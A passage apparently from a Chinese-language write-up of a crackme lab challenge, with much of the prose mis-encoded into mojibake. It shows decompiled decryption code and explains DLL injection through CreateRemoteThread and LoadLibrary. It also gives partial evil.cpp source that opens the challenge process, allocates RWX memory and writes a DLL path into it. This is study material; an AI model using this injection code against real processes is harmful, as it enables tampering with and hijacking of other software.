(__m128)_mm_mul_epi32(_mm_unpackhi_epi32(v22, v22), v17),</span><br><span class="line">                         <span class="number">221</span>),</span><br><span class="line">              v22),</span><br><span class="line">            v20);</span><br><span class="line">    v25 = _mm_and_si128(</span><br><span class="line">            _mm_shuffle_epi32(</span><br><span class="line">              _mm_shufflehi_epi16(</span><br><span class="line">                _mm_shufflelo_epi16(</span><br><span class="line">                  _mm_sub_epi32(v22, _mm_mullo_epi32(_mm_add_epi32(_mm_srl_epi32(v24, v21), v24), v18)),</span><br><span class="line">                  <span class="number">216</span>),</span><br><span class="line">                <span class="number">216</span>),</span><br><span class="line">              <span class="number">216</span>),</span><br><span class="line">            (__m128i)xmmword_7FF755DC56A0);</span><br><span class="line">    *((_DWORD *)v15 - <span class="number">3</span>) = _mm_cvtsi128_si32(</span><br><span class="line">                             _mm_xor_si128(</span><br><span class="line">                               _mm_add_epi8(_mm_packus_epi16(v25, v25), _mm_cvtsi32_si128(v19)),</span><br><span class="line">                               _mm_cvtsi32_si128(*((_DWORD *)v15 - <span class="number">3</span>))));</span><br><span class="line">    v26 = _mm_sra_epi32(</span><br><span class="line">            _mm_add_epi32(</span><br><span class="line">              (__m128i)_mm_shuffle_ps(</span><br><span class="line">                         (__m128)_mm_mul_epi32(_mm_unpacklo_epi32(v23, v23), v17),</span><br><span class="line">                         (__m128)_mm_mul_epi32(_mm_unpackhi_epi32(v23, v23), v17),</span><br><span class="line">                         <span class="number">221</span>),</span><br><span class="line">              v23),</span><br><span class="line">            v20);</span><br><span class="line">    v27 = _mm_and_si128(</span><br><span class="line">            _mm_shuffle_epi32(</span><br><span class="line">              _mm_shufflehi_epi16(</span><br><span class="line">                _mm_shufflelo_epi16(</span><br><span class="line">                  _mm_sub_epi32(v23, _mm_mullo_epi32(_mm_add_epi32(_mm_srl_epi32(v26, v21), v26), v18)),</span><br><span class="line">                  <span class="number">216</span>),</span><br><span class="line">                <span class="number">216</span>),</span><br><span class="line">              <span class="number">216</span>),</span><br><span class="line">            (__m128i)xmmword_7FF755DC56A0);</span><br><span class="line">    *((_DWORD *)v15 - <span class="number">2</span>) = _mm_cvtsi128_si32(</span><br><span class="line">                             _mm_xor_si128(</span><br><span class="line">                               _mm_add_epi8(_mm_packus_epi16(v27, v27), _mm_cvtsi32_si128(v19)),</span><br><span class="line">                               _mm_cvtsi32_si128(*((_DWORD *)v15 - <span class="number">2</span>))));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v0 &lt; <span class="number">32</span> );</span><br><span class="line">  <span class="keyword">if</span> ( v0 &lt; <span class="number">33</span> )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_9:</span><br><span class="line">    v28 = (<span class="type">char</span> *)v35 + v0;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      ++v28;</span><br><span class="line">      v29 = v0 / <span class="number">57</span>;</span><br><span class="line">      v30 = v0++;</span><br><span class="line">      *(v28 - <span class="number">1</span>) ^= v30 - <span class="number">57</span> * v29 + <span class="number">53</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v0 &lt; <span class="number">33</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  v31 = v37;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v32 = (<span class="type">unsigned</span> __int8)*(v31 - <span class="number">48</span>);</span><br><span class="line">    v33 = (<span class="type">unsigned</span> __int8)*v31 - v32;</span><br><span class="line">    <span class="keyword">if</span> ( v33 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++v31;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v32 );</span><br><span class="line">  <span class="keyword">if</span> ( v33 )</span><br><span class="line">    v34.m128i_i32[<span class="number">0</span>] = <span class="number">-872817740</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v34.m128i_i32[<span class="number">0</span>] = <span class="number">-1879061547</span>;</span><br><span class="line">  v34.m128i_i16[<span class="number">2</span>] = <span class="number">3338</span>;</span><br><span class="line">  *(__int16 *)((<span class="type">char</span> *)v34.m128i_i16 + <span class="number">1</span>) ^= <span class="number">0x3736</span>u;</span><br><span class="line">  v34.m128i_i8[<span class="number">3</span>] ^= <span class="number">0x38</span>u;</span><br><span class="line">  v34.m128i_i8[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">  sub_7FF755DA1020(&amp;v34);</span><br><span class="line">  Sleep(<span class="number">0x1388</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>åˆ›å»ºäº†ä¸€ä¸ªå­è¿›ç¨‹</li><li>sub_7FF755DA1070(&amp;unk_7FF755DC5600, v37);ç¬¬ä¸€ä¸ªå‚æ•°ä¸º%sï¼ŒçŒœæµ‹ä¸ºscanfå‡½æ•°ï¼Œv37å°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„flagï¼Œå­˜å‚¨åœ¨[rcx-8]ä¸­</li></ul><p>æ‰“æ–­ç‚¹åœ¨scanfç„¶åè¿›ä¸€æ­¥è°ƒè¯•ï¼Œè§‚å¯Ÿæ ˆä¸­æ•°æ®å˜åŒ–ï¼Œå‘ç°[rbp+57h+var_B0]ä¸­å­˜å‚¨çš„æ˜¯flagçš„ä¿¡æ¯ï¼Œ</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231215213439983.png" alt="image-20231215213439983" style="zoom:50%;" /><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231215214312875.png" alt="image-20231215214312875"></p><p>å­—ç¬¦ä¸²ä¸ºï¼šHiGWDUuXQS6wVHBTp0ERfJe6VqprMqD1</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231215214839633.png" alt="image-20231215214839633" style="zoom:50%;" /><h3 id="2-è¿œç¨‹æ³¨å…¥æ¨¡å—"><a href="#2-è¿œç¨‹æ³¨å…¥æ¨¡å—" class="headerlink" title="2.è¿œç¨‹æ³¨å…¥æ¨¡å—"></a>2.è¿œç¨‹æ³¨å…¥æ¨¡å—</h3><h4 id="è¦æ±‚"><a href="#è¦æ±‚" class="headerlink" title="è¦æ±‚"></a>è¦æ±‚</h4><ul><li>ä½¿ç”¨Windows API CreateRemoteThread è¿œç¨‹æ³¨å…¥æ¨¡å—åˆ°crackmeè¿›ç¨‹ä¸­å¹¶ä¸”ä¸å´©æºƒ</li><li>ç„¶åä½¿ç”¨arkå·¥å…·(ä¾‹å¦‚processhackerç­‰)èƒ½å¤ŸæŸ¥çœ‹æ³¨å…¥æ¨¡å—çš„ä¿¡æ¯ã€‚</li><li>é€šè¿‡Hookè¿›ç¨‹ä¸­çš„å‡½æ•°ä½¿å¾—è¾“å…¥ä»»ä½•å­—ç¬¦ä¸²ï¼Œæ§åˆ¶å°éƒ½ä¼šæ‰“å°â€æ­£ç¡®â€ã€‚</li></ul><h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h4><blockquote><p> Dllæ³¨å…¥åŸç†</p></blockquote><p>Dllæ³¨å…¥ä¸€èˆ¬æŒ‡å‘ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„ç¨‹åºæ³¨å…¥ä¸€ä¸ªçº¿ç¨‹,æ³¨å…¥çš„çº¿ç¨‹è¿è¡Œæˆ‘ä»¬çš„ä»£ç ,è€Œæˆ‘ä»¬çš„ä»£ç å°±ä»¥DLL(åŠ¨æ€é“¾æ¥åº“)çš„å½¢å¼å­˜åœ¨ã€‚ä½†æ˜¯ç¨‹åºä¸ä¼šå¹³ç™½æ— æ•…çš„å°±åŠ è½½æˆ‘ä»¬çš„dll,è¿™æ—¶å€™å°±éœ€è¦ä½¿ç”¨æˆ‘ä»¬å¼ºå¤§çš„Windows APIäº†,å®ƒä¸ºæˆ‘ä»¬æä¾›äº†å¤§é‡çš„å‡½æ•°æ¥é™„åŠ å’Œæ“çºµå…¶ä»–è¿›ç¨‹ã€‚<br> APIä¸­çš„æ‰€æœ‰å‡½æ•°éƒ½åŒ…å«äºDLLæ–‡ä»¶ä¹‹ä¸­ã€‚å…¶ä¸­ï¼Œæœ€é‡è¦çš„æ˜¯â€œKernel32.dllâ€ï¼ˆåŒ…å«ç®¡ç†å†…å­˜ï¼Œè¿›ç¨‹å’Œçº¿ç¨‹ç›¸å…³çš„å‡½æ•°ï¼‰ï¼Œâ€œUser32.dllâ€ï¼ˆå¤§éƒ¨åˆ†æ˜¯ç”¨æˆ·æ¥å£å‡½æ•°ï¼‰ï¼Œå’Œâ€œGDI32.dllâ€ï¼ˆç»˜åˆ¶å›¾å½¢å’Œæ˜¾ç¤ºæ–‡æœ¬ç›¸å…³çš„å‡½æ•°ï¼‰ã€‚ã€‚</p><p>å…¶ä¸­æœ€ç»å…¸çš„æ³¨å…¥æ–¹å¼ï¼š<strong>è¿œç¨‹è¿›ç¨‹æ³¨å…¥</strong></p><p>è¿™ç§æ–¹æ³•çµæ´»æ€§é«˜,åŒæ—¶è¦æ±‚æŒæ¡çš„çŸ¥è¯†ä¹Ÿå¾ˆå¤šï¼Œå…¶æ ¸å¿ƒæ€æƒ³å°±æ˜¯<strong>åœ¨ç›®æ ‡è¿›ç¨‹ä¸­å¼€å¯ä¸€ä¸ªçº¿ç¨‹è°ƒç”¨LoadLibraryå‡½æ•°æ¥åŠ è½½æˆ‘ä»¬æƒ³è¦æ³¨å…¥çš„dll.</strong></p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231215181957773.png" alt="image-20231215181957773" style="zoom: 50%;" /><blockquote><p>å…·ä½“æµç¨‹</p></blockquote><ul><li>è·å¾—è¦æ³¨å…¥è¿›ç¨‹çš„è¿›ç¨‹IDï¼Œå¯ä»¥ä½¿ç”¨è¿›ç¨‹åè·å¾—ã€‚</li><li>ä½¿ç”¨VirtualAllocEx apiæ¥åœ¨è¯¥è¿›ç¨‹å†…å¼€è¾Ÿä¸€å—å†…å­˜ï¼Œå¤§å°æ­£å¥½æ˜¯DLLè·¯å¾„ã€‚</li><li>å°†DLLè·¯å¾„ä¿¡æ¯é€šè¿‡WriteProcessMemory å†™å…¥è¯¥è¿›ç¨‹ç©ºé—´ã€‚</li><li>è·å¾—kernal32åœ¨æœ¬è¿›ç¨‹çš„åœ°å€ã€‚å› ä¸ºåŒå¹³å°ä¸‹æ‰€æœ‰exeéƒ½åœ¨åŒä¸€ä½ç½®åŠ è½½kernal32ã€‚</li><li>åœ¨kernal32ä¸­è·å¾—LoadLibraryWçš„åœ°å€ï¼Œæ­¤åœ°å€ä¹Ÿæ˜¯è¢«æ³¨å…¥è¿›ç¨‹çš„LoadLibraryWåœ°å€ã€‚</li><li>åˆ›å»ºè¿œç¨‹çº¿ç¨‹æ‰§è¡Œè¿™ä¸ªLoadLibraryWæ“ä½œï¼Œå‚æ•°å°±æ˜¯è¦ä¼ å…¥çš„DLLè·¯å¾„ã€‚</li></ul><blockquote><p>dllæ–‡ä»¶ç»“æ„</p></blockquote><p><strong>DllMain</strong></p><p> è·Ÿexeæœ‰ä¸ªmainæˆ–è€…WinMainå…¥å£å‡½æ•°ä¸€æ ·ï¼ŒDLLä¹Ÿæœ‰ä¸€ä¸ªå…¥å£å‡½æ•°ï¼Œå°±æ˜¯DllMainã€‚ä»¥â€œDllMainâ€ä¸ºå…³é”®å­—ã€‚å¯¹äºåŠ¨æ€é“¾æ¥åº“ï¼ŒDllMainæ˜¯ä¸€ä¸ªå¯é€‰çš„å…¥å£å‡½æ•°ã€‚</p><p>å‡½æ•°å®šä¹‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BOOL WINAPI DllMain(</span><br><span class="line">  _In_ HINSTANCE hinstDLL, // æŒ‡å‘è‡ªèº«çš„å¥æŸ„</span><br><span class="line">  _In_ DWORD fdwReason, // è°ƒç”¨åŸå› </span><br><span class="line">  _In_ LPVOID lpvReserved // éšå¼åŠ è½½å’Œæ˜¾å¼åŠ è½½</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>å¯¹äºç¬¬äºŒä¸ªå‚æ•°fdwReasonï¼šå®ƒæŒ‡æ˜äº†ç³»ç»Ÿè°ƒç”¨Dllçš„åŸå› ï¼Œå¯èƒ½æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DLL_PROCESS_ATTACH</span><br><span class="line">DLL_PROCESS_DETACH</span><br><span class="line">DLL_THREAD_ATTACH</span><br><span class="line">DLL_THREAD_DETACH</span><br></pre></td></tr></table></figure><p>ä¸‹é¢è¯¦ç»†åˆ†æï¼š</p><ul><li>è¿›ç¨‹æ˜ å°„</li></ul><p>DLL_PROCESS_ATTACH</p><p>ä¸€ä¸ªç¨‹åºè¦è°ƒç”¨Dllé‡Œçš„å‡½æ•°ï¼Œé¦–å…ˆè¦å…ˆæŠŠDLLæ–‡ä»¶æ˜ å°„åˆ°è¿›ç¨‹çš„åœ°å€ç©ºé—´ã€‚è¦æŠŠä¸€ä¸ªDLLæ–‡ä»¶æ˜ å°„åˆ°è¿›ç¨‹çš„åœ°å€ç©ºé—´ï¼Œæœ‰ä¸¤ç§æ–¹æ³•ï¼šLoadLibraryæˆ–è€…LoadLibraryExã€‚</p><p>å½“ä¸€ä¸ªDLLæ–‡ä»¶è¢«æ˜ å°„åˆ°è¿›ç¨‹çš„åœ°å€ç©ºé—´æ—¶ï¼Œç³»ç»Ÿè°ƒç”¨è¯¥DLLçš„DllMainå‡½æ•°ï¼Œä¼ é€’çš„fdwReasonå‚æ•°ä¸ºDLL_PROCESS_ATTACHï¼Œè¿™ç§è°ƒç”¨åªä¼šå‘ç”Ÿåœ¨ç¬¬ä¸€æ¬¡æ˜ å°„æ—¶ã€‚å¦‚æœåŒä¸€ä¸ªè¿›ç¨‹åæ¥ä¸ºå·²ç»æ˜ å°„è¿›æ¥çš„DLLå†æ¬¡è°ƒç”¨LoadLibraryæˆ–è€…LoadLibraryExï¼Œæ“ä½œç³»ç»Ÿåªä¼šå¢åŠ DLLçš„ä½¿ç”¨æ¬¡æ•°ï¼Œå®ƒä¸ä¼šå†ç”¨DLL_PROCESS_ATTACHè°ƒç”¨DLLçš„DllMainå‡½æ•°ã€‚ä¸åŒè¿›ç¨‹ç”¨LoadLibraryåŒä¸€ä¸ªDLLæ—¶ï¼Œæ¯ä¸ªè¿›ç¨‹çš„ç¬¬ä¸€æ¬¡æ˜ å°„éƒ½ä¼šç”¨DLL_PROCESS_ATTACHè°ƒç”¨DLLçš„DllMainå‡½æ•°ã€‚</p><ul><li>è¿›ç¨‹å¸è½½</li></ul><p>DLL_PROCESS_DETACH</p><p>å½“DLLè¢«ä»è¿›ç¨‹çš„åœ°å€ç©ºé—´è§£é™¤æ˜ å°„æ—¶ï¼Œç³»ç»Ÿè°ƒç”¨äº†å®ƒçš„DllMainï¼Œä¼ é€’çš„fdwReasonå€¼æ˜¯DLL_PROCESS_DETACHã€‚å½“DLLå¤„ç†è¯¥å€¼æ—¶ï¼Œå®ƒåº”è¯¥æ‰§è¡Œè¿›ç¨‹ç›¸å…³çš„æ¸…ç†å·¥ä½œã€‚</p><p>é‚£ä¹ˆä»€ä¹ˆæ—¶å€™DLLè¢«ä»è¿›ç¨‹çš„åœ°å€ç©ºé—´è§£é™¤æ˜ å°„å‘¢ï¼Ÿä¸¤ç§æƒ…å†µï¼š</p><p>â€‹1.FreeLibraryè§£é™¤DLLæ˜ å°„ï¼ˆæœ‰å‡ ä¸ªLoadLibraryï¼Œå°±è¦æœ‰å‡ ä¸ªFreeLibraryï¼‰</p><p>â€‹2.è¿›ç¨‹ç»“æŸè€Œè§£é™¤DLLæ˜ å°„ï¼Œåœ¨è¿›ç¨‹ç»“æŸå‰è¿˜æ²¡æœ‰è§£é™¤DLLçš„æ˜ å°„ï¼Œè¿›ç¨‹ç»“æŸåä¼šè§£é™¤DLLæ˜ å°„ã€‚ï¼ˆå¦‚æœè¿›ç¨‹çš„ç»ˆç»“æ˜¯å› ä¸ºè°ƒç”¨äº†TerminateProcessï¼Œç³»ç»Ÿå°±ä¸ä¼šç”¨DLL_PROCESS_DETACHæ¥è°ƒç”¨DLLçš„DllMainå‡½æ•°ã€‚è¿™å°±æ„å‘³ç€DLLåœ¨è¿›ç¨‹ç»“æŸå‰æ²¡æœ‰æœºä¼šæ‰§è¡Œä»»ä½•æ¸…ç†å·¥ä½œã€‚ï¼‰</p><p>æ³¨æ„ï¼šå½“ç”¨DLL_PROCESS_ATTACHè°ƒç”¨DLLçš„DllMainå‡½æ•°æ—¶ï¼Œå¦‚æœè¿”å›FALSEï¼Œè¯´æ˜æ²¡æœ‰åˆå§‹åŒ–æˆåŠŸï¼Œç³»ç»Ÿä»ä¼šç”¨DLL_PROCESS_DETACHè°ƒç”¨DLLçš„DllMainå‡½æ•°ã€‚å› æ­¤ï¼Œå¿…é¡»ç¡®ä¿æ¸…ç†é‚£äº›æ²¡æœ‰æˆåŠŸåˆå§‹åŒ–çš„ä¸œè¥¿ã€‚</p><ul><li>çº¿ç¨‹æ˜ å°„</li></ul><p>DLL_THREAD_ATTACH</p><p>å½“è¿›ç¨‹åˆ›å»ºä¸€çº¿ç¨‹æ—¶ï¼Œç³»ç»ŸæŸ¥çœ‹å½“å‰æ˜ å°„åˆ°è¿›ç¨‹åœ°å€ç©ºé—´ä¸­çš„æ‰€æœ‰DLLæ–‡ä»¶æ˜ åƒï¼Œå¹¶ç”¨å€¼DLL_THREAD_ATTACHè°ƒç”¨DLLçš„DllMainå‡½æ•°ã€‚</p><p>æ–°åˆ›å»ºçš„çº¿ç¨‹è´Ÿè´£æ‰§è¡Œè¿™æ¬¡çš„DLLçš„DllMainå‡½æ•°ï¼Œåªæœ‰å½“æ‰€æœ‰çš„DLLéƒ½å¤„ç†å®Œè¿™ä¸€é€šçŸ¥åï¼Œç³»ç»Ÿæ‰å…è®¸è¿›ç¨‹å¼€å§‹æ‰§è¡Œå®ƒçš„çº¿ç¨‹å‡½æ•°ã€‚</p><p>æ³¨æ„è·ŸDLL_PROCESS_ATTACHçš„åŒºåˆ«ï¼Œç¬¬n(n&gt;&#x3D;2)æ¬¡ä»¥ååœ°æŠŠDLLæ˜ åƒæ–‡ä»¶æ˜ å°„åˆ°è¿›ç¨‹çš„åœ°å€ç©ºé—´æ—¶ï¼Œæ˜¯ä¸å†ç”¨DLL_PROCESS_ATTACHè°ƒç”¨DllMainçš„ã€‚è€ŒDLL_THREAD_ATTACHä¸åŒï¼Œè¿›ç¨‹ä¸­çš„æ¯æ¬¡å»ºç«‹çº¿ç¨‹ï¼Œéƒ½ä¼šç”¨å€¼DLL_THREAD_ATTACHè°ƒç”¨DllMainå‡½æ•°ï¼Œå“ªæ€•æ˜¯çº¿ç¨‹ä¸­å»ºç«‹çº¿ç¨‹ä¹Ÿä¸€æ ·ã€‚</p><ul><li>çº¿ç¨‹å¸è½½</li></ul><p>DLL_THREAD_DETACH</p><p>å¦‚æœçº¿ç¨‹è°ƒç”¨äº†ExitThreadæ¥ç»“æŸçº¿ç¨‹ï¼ˆçº¿ç¨‹å‡½æ•°è¿”å›æ—¶ï¼Œç³»ç»Ÿä¹Ÿä¼šè‡ªåŠ¨è°ƒç”¨ExitThreadï¼‰ï¼Œç³»ç»ŸæŸ¥çœ‹å½“å‰æ˜ å°„åˆ°è¿›ç¨‹ç©ºé—´ä¸­çš„æ‰€æœ‰DLLæ–‡ä»¶æ˜ åƒï¼Œå¹¶ç”¨DLL_THREAD_DETACHæ¥è°ƒç”¨DllMainå‡½æ•°ï¼Œé€šçŸ¥æ‰€æœ‰çš„DLLå»æ‰§è¡Œçº¿ç¨‹çº§çš„æ¸…ç†å·¥ä½œã€‚</p><p>æ³¨æ„ï¼šå¦‚æœçº¿ç¨‹çš„ç»“æŸæ˜¯å› ä¸ºç³»ç»Ÿä¸­çš„ä¸€ä¸ªçº¿ç¨‹è°ƒç”¨äº†<code>TerminateThread</code>ï¼Œç³»ç»Ÿå°±ä¸ä¼šç”¨å€¼DLL_THREAD_DETACHæ¥è°ƒç”¨æ‰€æœ‰DLLçš„DllMainå‡½æ•°ã€‚</p><h4 id="å…³äºæœ¬é¢˜-1"><a href="#å…³äºæœ¬é¢˜-1" class="headerlink" title="å…³äºæœ¬é¢˜"></a>å…³äºæœ¬é¢˜</h4><h5 id="æ³¨å…¥æ–‡ä»¶ï¼ševil-cpp-ç”Ÿæˆevil-exe"><a href="#æ³¨å…¥æ–‡ä»¶ï¼ševil-cpp-ç”Ÿæˆevil-exe" class="headerlink" title="æ³¨å…¥æ–‡ä»¶ï¼ševil.cpp(ç”Ÿæˆevil.exe)"></a>æ³¨å…¥æ–‡ä»¶ï¼ševil.cpp(ç”Ÿæˆevil.exe)</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function">BOOL <span class="title">CreateRemoteDllInjectDll</span><span class="params">(DWORD ProcessID)</span></span>;</span><br><span class="line"><span class="function">DWORD <span class="title">FindProcessID</span><span class="params">(LPCTSTR szProcessName)</span></span>;</span><br><span class="line"><span class="comment">//DWORD FindProcessID(const wchar_t* szProcessName);</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//Get the pid by name</span></span><br><span class="line">DWORD pid = <span class="built_in">FindProcessID</span>(<span class="string">&quot;crackme.exe&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pid:%d\n&quot;</span>, pid);</span><br><span class="line"><span class="comment">//DLL inject</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">CreateRemoteDllInjectDll</span>(pid)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;faild to create remotedllinject evil.dll&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;die&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//Create remotedllinject evil.dll</span></span><br><span class="line"><span class="function">BOOL <span class="title">CreateRemoteDllInjectDll</span><span class="params">(DWORD ProcessID)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> DllName[_MAX_PATH] =<span class="string">&quot;E:\\school\\TencentClass\\T1\\TencentClass_T1.dll&quot;</span>;</span><br><span class="line">HANDLE hProcess = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ³¨å…¥è¿›ç¨‹</span></span><br><span class="line">hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, ProcessID);<span class="comment">//æ‰“å¼€è¿›ç¨‹è·å–å¥æŸ„</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == hProcess) &#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;OpenProcess error&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> dwsize = <span class="built_in">sizeof</span>(DllName);</span><br><span class="line"><span class="type">void</span>* pDLLAddr = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, dwsize, MEM_COMMIT,PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="comment">//åˆ†é…è™šæ‹Ÿå†…å­˜ï¼Œå¹¶ä¸”åœ°å€ä¿å­˜åœ¨pDLLAddrç›®å½•ä¸­</span></span><br><span class="line"><span class="keyword">if</span> (pDLLAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;VirtualAllocEx is error&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">WriteProcessMemory</span>(hProcess, pDLLAddr, (<span class="type">void</span>*)DllName, dwsize, <span class="literal">NULL</span>))</span><br><span class="line">&#123;<span class="comment">//æŠŠæ‰€éœ€è¦çš„æ³¨å…¥çš„dllæ–‡ä»¶ç›®å½•å­—ç¬¦æ³¨å…¥ç»™ç›®æ ‡è¿›ç¨‹</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;WriteProcessMemory is error&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è·å–åœ°å€</span></span><br><span class="line">HMODULE hModule = <span class="built_in">GetModuleHandle</span>(<span class="string">&quot;Kernel32&quot;</span>);<span class="comment">//è·å–kernel32.dllæ¨¡å—</span></span><br><span class="line"><span class="keyword">if</span> (hModule == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;kernel32 error&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">LPTHREAD_START_ROUTINE LoadLibraryAddr = (LPTHREAD_START_ROUTINE)<span class="built_in">GetProcAddress</span>(hModule, <span class="string">&quot;LoadLibraryA&quot;</span>);<span class="comment">//è¿›ä¸€æ­¥è·å–LoadLibraryAçš„å‡½æ•°åœ°å€</span></span><br><span class="line"><span class="keyword">if</span> (LoadLibraryAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;LoadLibraryAddr error&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æ‰§è¡Œè¿œç¨‹çº¿ç¨‹æ³¨å…¥</span></span><br><span class="line"><span class="comment">//HANDLE hRemotehandle = CreateRemoteThread(hProcess, NULL, 0,LoadLibraryAddr, pDLLAddr, 0, NULL); //åˆ›é€ è¿œç¨‹çº¿ç¨‹æ³¨å…¥åˆ°ç›®æ 